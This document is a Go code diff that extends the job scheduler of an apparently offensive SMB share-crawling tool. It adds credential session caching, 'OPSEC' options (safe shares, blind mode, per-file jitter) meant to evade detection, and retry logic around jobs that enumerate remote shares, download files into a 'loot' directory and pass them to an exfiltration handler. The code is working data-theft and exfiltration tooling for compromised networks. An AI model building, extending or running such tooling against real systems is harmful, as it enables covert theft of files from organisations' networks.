@@ -58,18 +58,31 @@ type Scheduler struct {
 	LootDir     string
 
 	// Internal
-	pq PriorityQueue
-	mu sync.RWMutex
+	pq           PriorityQueue
+	mu           sync.RWMutex
+	AuthHold     bool
+	SessionCache map[string]*smb.Session
+	CacheMu      sync.Mutex
+
+	// OPSEC Configs
+	SafeShares bool
+	BlindMode  bool
+	FileJitter time.Duration
 }
 
-func NewScheduler(workerCount int, exfilCfg exfil.Config) *Scheduler {
+func NewScheduler(workerCount int, exfilCfg exfil.Config, authHold bool, safeShares bool, blindMode bool, jitter time.Duration) *Scheduler {
 	return &Scheduler{
-		Queue:       make(chan utils.QueueItem, 100),
-		Output:      make(chan tea.Msg, 100),
-		WorkerCount: workerCount,
-		Exfil:       exfil.NewHandler(exfilCfg),
-		LootDir:     "loot", // default
-		pq:          make(PriorityQueue, 0),
+		Queue:        make(chan utils.QueueItem, 100),
+		Output:       make(chan tea.Msg, 100),
+		WorkerCount:  workerCount,
+		Exfil:        exfil.NewHandler(exfilCfg),
+		LootDir:      "loot", // default
+		pq:           make(PriorityQueue, 0),
+		AuthHold:     authHold,
+		SessionCache: make(map[string]*smb.Session),
+		SafeShares:   safeShares,
+		BlindMode:    blindMode,
+		FileJitter:   jitter,
 	}
 }
 
@@ -82,6 +95,32 @@ func (s *Scheduler) SetLootDir(p string) {
 func (s *Scheduler) Start() {
 	// Start the main scheduling loop
 	go s.scheduleLoop()
+}
+
+func (s *Scheduler) CloseAllSessions() {
+	s.CacheMu.Lock()
+	defer s.CacheMu.Unlock()
+	for ip, sess := range s.SessionCache {
+		sess.Close()
+		delete(s.SessionCache, ip)
+	}
+}
+
+// PrioritizeJob finds a job by ID in the queue and bumps it to immediate execution
+func (s *Scheduler) PrioritizeJob(jobID string) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	for i, item := range s.pq {
+		if item.ID == jobID {
+			// Update item
+			item.Priority = true
+			item.ScheduledTime = time.Now().Add(-1 * time.Hour) // Past
+			// Fix heap
+			heap.Fix(&s.pq, i)
+			return
+		}
+	}
 }
 
 func (s *Scheduler) scheduleLoop() {
@@ -177,32 +216,101 @@ func (s *Scheduler) scheduleLoop() {
 
 func (s *Scheduler) worker(jobs <-chan utils.QueueItem) {
 	for job := range jobs {
-		s.processJob(job)
+		s.processJobWithRetry(job)
 	}
 }
 
-func (s *Scheduler) processJob(job utils.QueueItem) {
-	f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if f != nil {
-		fmt.Fprintf(f, "Processing Job: ID=%s Type=%s Target=%s\n", job.ID, job.ActionType, job.Target)
-		f.Close()
-	}
-
-	if job.Host == nil {
-		return
-	}
-
-	session, err := smb.Connect(job.HostIP, job.Host.Creds)
-	if err != nil {
-		s.Output <- utils.JobResult{
-			QueueID: job.ID,
-			HostIP:  job.HostIP,
-			Success: false,
-			Error:   err.Error(),
+func (s *Scheduler) getSession(job utils.QueueItem) (*smb.Session, bool, error) {
+	// Returns session, isCached(bool), error
+	if s.AuthHold {
+		s.CacheMu.Lock()
+		if sess, ok := s.SessionCache[job.HostIP]; ok {
+			s.CacheMu.Unlock()
+			return sess, true, nil
 		}
+		s.CacheMu.Unlock()
+	}
+
+	// Not cached or caching disabled
+	sess, err := smb.Connect(job.HostIP, job.Host.Creds)
+	if err != nil {
+		return nil, false, err
+	}
+
+	if s.AuthHold {
+		s.CacheMu.Lock()
+		s.SessionCache[job.HostIP] = sess
+		s.CacheMu.Unlock()
+		return sess, false, nil // It is now cached, but "isCached" false implies it's new for this call
+	}
+	return sess, false, nil
+}
+
+func (s *Scheduler) processJobWithRetry(job utils.QueueItem) {
+	// Wrapper to handle session retry
+	session, usedCache, err := s.getSession(job)
+	if err != nil {
+		s.sendError(job, err.Error())
 		return
 	}
-	defer session.Close()
+
+	// If we aren't holding auth, we ensure we close it
+	if !s.AuthHold {
+		defer session.Close()
+	}
+
+	// Try execution
+	err = s.executeJob(session, job)
+	if err != nil {
+		// If failure AND we used a cached session, maybe it timed out?
+		if s.AuthHold && usedCache {
+			// Log retry?
+			f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+			if f != nil {
+				fmt.Fprintf(f, "Job %s failed on cached session. Retrying...\n", job.ID)
+				f.Close()
+			}
+
+			// Invalidate cache
+			s.CacheMu.Lock()
+			delete(s.SessionCache, job.HostIP)
+			s.CacheMu.Unlock()
+			// Close old session just in case
+			session.Close()
+
+			// Re-connect
+			newSess, _, err2 := s.getSession(job)
+			if err2 != nil {
+				s.sendError(job, "Retry Connect Fail: "+err2.Error())
+				return
+			}
+			// No defer close because it's in cache now
+
+			// Retry execute
+			err = s.executeJob(newSess, job)
+			if err != nil {
+				s.sendError(job, "Retry Exec Fail: "+err.Error())
+			}
+			return
+		}
+		// Not cached, or retry failed
+		s.sendError(job, err.Error())
+		return
+	}
+}
+
+func (s *Scheduler) sendError(job utils.QueueItem, msg string) {
+	s.Output <- utils.JobResult{
+		QueueID:    job.ID,
+		HostIP:     job.HostIP,
+		Success:    false,
+		Error:      msg,
+		ActionType: job.ActionType,
+		Target:     job.Target,
+	}
+}
+
+func (s *Scheduler) executeJob(session *smb.Session, job utils.QueueItem) error {
 
 	switch job.ActionType {
 	case "PULL":
@@ -210,30 +318,19 @@ func (s *Scheduler) processJob(job utils.QueueItem) {
 		share, path := utils.SplitSharePath(job.Target)
 		localDest := filepath.Join(s.LootDir, job.HostIP, share, path)
 
-		err = session.DownloadFile(share, path, localDest)
+		err := session.DownloadFile(share, path, localDest)
 		if err != nil {
-			s.Output <- utils.JobResult{
-				QueueID:    job.ID,
-				HostIP:     job.HostIP,
-				Success:    false,
-				Error:      err.Error(),
-				ActionType: "PULL",
-				Target:     job.Target,
-			}
-			return
+			return err
 		}
 
 		// Exfiltrate
 		if err := s.Exfil.Exfiltrate(localDest); err != nil {
-			s.Output <- utils.JobResult{
-				QueueID:    job.ID,
-				HostIP:     job.HostIP,
-				Success:    false, // Mark as fail if exfil fails? Or partial?
-				Error:      "Exfil failed: " + err.Error(),
-				ActionType: "PULL",
-				Target:     job.Target,
-			}
-			return
+			// Exfil fail is technically a "success" for SMB pull, but let's report it
+			// or we can treat it as non-retriable error?
+			// For now, let's treat it as success-with-error, but we can't retry Exfil by re-pulling easily
+			// actually we can.
+			// Let's just return error for simplicity, allowing retry if logical
+			return fmt.Errorf("exfil failed: %w", err)
 		}
 
 		s.Output <- utils.JobResult{
@@ -243,17 +340,12 @@ func (s *Scheduler) processJob(job utils.QueueItem) {
 			ActionType: "PULL",
 			Target:     job.Target,
 		}
+		return nil
+
 	case "TREE":
-		shares, err := scanner.ScanHost(session, job.Host, job.DepthParam)
+		shares, err := scanner.ScanHost(session, job.Host, job.DepthParam, s.SafeShares, s.BlindMode, s.FileJitter)
 		if err != nil {
-			s.Output <- utils.JobResult{
-				QueueID:    job.ID,
-				HostIP:     job.HostIP,
-				Success:    false,
-				Error:      err.Error(),
-				ActionType: "TREE",
-			}
-			return
+			return err
 		}
 		s.Output <- utils.JobResult{
 			QueueID:    job.ID,
@@ -262,22 +354,16 @@ func (s *Scheduler) processJob(job utils.QueueItem) {
 			Shares:     shares,
 			ActionType: "TREE",
 		}
+		return nil
+
 	case "EXPAND_DIR":
 		share, path := utils.SplitSharePath(job.Target)
 
-		children, err := scanner.ScanDir(session, share, path, job.DepthParam)
+		children, err := scanner.ScanDir(session, share, path, job.DepthParam, s.BlindMode, s.FileJitter)
 		if err != nil {
-			s.Output <- utils.JobResult{
-				QueueID:    job.ID,
-				HostIP:     job.HostIP,
-				Success:    false,
-				Error:      err.Error(),
-				ActionType: "EXPAND_DIR",
-			}
-			return
+			return err
 		}
 		// Return shares as "Children" roughly attached to a dummy root?
-		// We'll pass them in Shares field of result, caller will attach.
 		s.Output <- utils.JobResult{
 			QueueID:    job.ID,
 			HostIP:     job.HostIP,
@@ -286,7 +372,9 @@ func (s *Scheduler) processJob(job utils.QueueItem) {
 			ActionType: "EXPAND_DIR",
 			Target:     job.Target,
 		}
+		return nil
 	}
+	return nil
 }
 
 // GetQueueSnapshot returns a thread-safe copy of the current queue items
